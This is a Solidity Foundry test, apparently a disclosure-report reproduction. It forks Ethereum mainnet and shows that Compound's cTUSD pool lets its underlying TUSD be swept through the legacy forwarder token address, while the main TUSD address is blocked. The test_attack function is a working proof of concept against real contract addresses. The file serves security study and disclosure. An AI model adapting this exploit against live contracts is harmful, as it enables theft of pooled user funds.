// SPDX-License-Identifier: MIT
pragma solidity ^0.8.17;

import "forge-std/Test.sol";
import {TestHarness} from "../../TestHarness.sol";
import {TokenBalanceTracker} from '../../modules/TokenBalanceTracker.sol';

import {IERC20} from "../../interfaces/IERC20.sol";

interface ICERC20Delegator {
    function mint(uint256 mintAmount) external payable returns (uint256);
    function balanceOf(address _of) external view returns(uint256);
    function decimals() external view returns(uint16);
    function borrow(uint256 borrowAmount) external payable returns (uint256);
    function accrueInterest() external;
    function approve(address spender, uint256 amt) external;
    function redeemUnderlying(uint256 redeemAmount) external payable returns (uint256);
    function sweepToken(IERC20 token) external;
}


contract Report_Compound is TestHarness, TokenBalanceTracker {
    ICERC20Delegator internal cTUSD = ICERC20Delegator(0x12392F67bdf24faE0AF363c24aC620a2f67DAd86);

    IERC20 internal tusd = IERC20(0x0000000000085d4780B73119b644AE5ecd22b376); // Main entry point
    IERC20 internal tusdLegacy = IERC20(0x8dd5fbCe2F6a956C3022bA3663759011Dd51e73E); // Forwarder, side entry point

    function setUp() external {
        cheat.createSelectFork("mainnet", 14266479); // fork mainnet at block 14266479

        addTokenToTracker(address(tusd));
        addTokenToTracker(address(tusdLegacy)); // Should be the same as tusd

        updateBalanceTracker(address(cTUSD)); // Pool underlying balance.
        logBalancesWithLabel('Initial Pool Balances', address(cTUSD));
    }

    function test_attack() external {
        cheat.expectRevert(abi.encodePacked("CErc20::sweepToken: can not sweep underlying token"));
        cTUSD.sweepToken(tusd); // This reverts

        cTUSD.sweepToken(tusdLegacy); // This passes

        logBalancesWithLabel('Final Pool Balances', address(cTUSD));
    }
}
